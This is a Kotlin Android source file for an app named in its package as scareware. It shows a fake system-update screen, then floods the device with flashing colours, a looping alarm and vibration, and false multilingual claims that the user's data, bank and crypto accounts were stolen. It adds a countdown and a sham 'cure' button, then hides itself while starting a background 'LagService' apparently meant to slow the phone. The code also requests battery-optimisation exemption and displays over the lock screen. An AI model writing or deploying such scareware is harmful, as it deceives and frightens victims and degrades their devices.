package com.scareware.virus

import android.content.Intent
import android.graphics.Color
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private val handler = Handler(Looper.getMainLooper())
    private var glitchRunnable: Runnable? = null
    private var scareStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                )

        setContentView(R.layout.activity_main)

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            }
        } catch (_: Exception) {}

        // System Update screen stays ~7 seconds
        handler.postDelayed({
            showScarePhase()
        }, 7000)
    }

    private fun showScarePhase() {
        if (scareStarted) return
        scareStarted = true

        findViewById<LinearLayout>(R.id.updateScreen).visibility = View.GONE
        findViewById<View>(R.id.scareScreen).visibility = View.VISIBLE

        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.start()
        } catch (_: Exception) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(this@MainActivity, uri)
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }

        try {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 500, 200, 500, 200, 900), 0))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 500, 200, 500, 200, 900), 0)
            }
        } catch (_: Exception) {}

        startGlitch()
        cycleMessages()
        startTimer()

        findViewById<Button>(R.id.cureButton).setOnClickListener {
            val cure = findViewById<TextView>(R.id.cureText)
            cure.visibility = View.VISIBLE
            cure.text = """
                【解除病毒 / إزالة الفيروس】
                جارٍ التنظيف... 正在清理...
                (لن يتوقف إلا بعد إلغاء تثبيت التطبيق)
            """.trimIndent()
            handler.postDelayed({
                startLagAndHide()
            }, 2500)
        }

        handler.postDelayed({
            startLagAndHide()
        }, 25000)
    }

    private fun startGlitch() {
        val root = findViewById<View>(R.id.rootLayout)
        val img = findViewById<ImageView>(R.id.scaryImage)
        glitchRunnable = object : Runnable {
            override fun run() {
                val colors = intArrayOf(
                    Color.BLACK, Color.RED, Color.WHITE,
                    Color.YELLOW, Color.rgb(180, 0, 0)
                )
                root.setBackgroundColor(colors[Random.nextInt(colors.size)])
                val anim = AlphaAnimation(0.2f, 1f)
                anim.duration = 55
                anim.repeatMode = Animation.REVERSE
                anim.repeatCount = 2
                img.startAnimation(anim)
                handler.postDelayed(this, Random.nextLong(70, 300))
            }
        }
        handler.post(glitchRunnable!!)
    }

    private fun cycleMessages() {
        val messages = listOf(
            "⚠ تم اختراق جهازك ⚠",
            "⚠ YOUR DATA HAS BEEN STOLEN ⚠",
            "⚠ 您的数据已被窃取 ⚠",
            "⚠ تم سرقة بياناتك ⚠",
            "BANK / CRYPTO COMPROMISED",
            "PHOTOS & MESSAGES UPLOADED",
            "⚠ SYSTEM DESTROYED ⚠"
        )
        val tv = findViewById<TextView>(R.id.scareText)
        var i = 0
        handler.post(object : Runnable {
            override fun run() {
                tv.text = messages[i % messages.size]
                i++
                handler.postDelayed(this, 1300)
            }
        })
    }

    private fun startTimer() {
        val tv = findViewById<TextView>(R.id.timerText)
        var sec = 3599
        handler.post(object : Runnable {
            override fun run() {
                tv.text = String.format("الوقت المتبقي: %02d:%02d", sec / 60, sec % 60)
                if (sec > 0) sec--
                handler.postDelayed(this, 1000)
            }
        })
    }

    private fun startLagAndHide() {
        val svc = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }
        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
        mediaPlayer = null
        glitchRunnable?.let { handler.removeCallbacks(it) }
        finishAndRemoveTask()
    }

    override fun onUserLeaveHint() {
        startLagAndHide()
    }

    override fun onBackPressed() {
        startLagAndHide()
    }

    override fun onDestroy() {
        try {
            val svc = Intent(this, LagService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
            else startService(svc)
        } catch (_: Exception) {}
        mediaPlayer?.release()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
